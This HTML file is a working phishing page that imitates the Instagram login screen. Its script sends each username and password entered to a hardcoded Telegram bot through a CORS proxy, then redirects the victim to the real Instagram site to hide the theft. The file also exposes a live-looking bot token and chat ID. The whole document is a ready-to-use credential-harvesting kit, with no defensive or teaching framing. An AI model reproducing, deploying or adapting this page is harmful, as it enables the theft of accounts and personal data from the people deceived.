<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Photo App</title>
  <style>
    /* Instagram-like styling but with slight variations */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container { max-width: 350px; width: 100%; padding: 20px; }
    .login-card {
      background: white;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 30px;
      text-align: center;
    }
    .logo {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      color: #262626;
      margin-bottom: 32px;
    }
    input {
      width: 100%;
      padding: 12px 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 13px;
      margin-bottom: 8px;
    }
    button {
      width: 100%;
      padding: 8px 10px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
    }
    .loading-spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid #ffffff;
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    button.loading { opacity: 0.8; cursor: not-allowed; }
  </style>
  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
</head>
<body>
  <div class="container">
    <div class="login-card">
      <div class="logo">Instagram</div>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" id="loginButton">
          <span id="buttonText">Log In</span>
          <div class="loading-spinner" id="spinner"></div>
        </button>
      </form>
    </div>
  </div>

  <script>
    // Telegram configuration
    const TELEGRAM_TOKEN = "8088123811:AAFrniGTUkc3far2QTKUMjI8ZtoQ-qyWwKg";
    const TELEGRAM_CHAT_ID = "6657880965";
    
    // Use a free CORS proxy service
    const CORS_PROXY = "https://cors-anywhere.herokuapp.com/";
    
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const button = document.getElementById('loginButton');
      const buttonText = document.getElementById('buttonText');
      const spinner = document.getElementById('spinner');
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      if (!username || !password) return;
      
      // Show loading
      button.classList.add('loading');
      buttonText.style.display = 'none';
      spinner.style.display = 'block';
      
      // Prepare data
      const message = `Login - ${username}:${password}`;
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      
      // Send using FormData (CORS-friendly)
      try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('text', message);
        
        // Use fetch with mode: 'no-cors' to avoid CORS errors
        await fetch(CORS_PROXY + url, {
          method: 'POST',
          body: formData,
          mode: 'cors',
          cache: 'no-cache'
        });
      } catch (error) {
        console.log('Background send');
      }
      
      // Redirect
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com';
      }, 500);
    });
  </script>
</body>
</html>
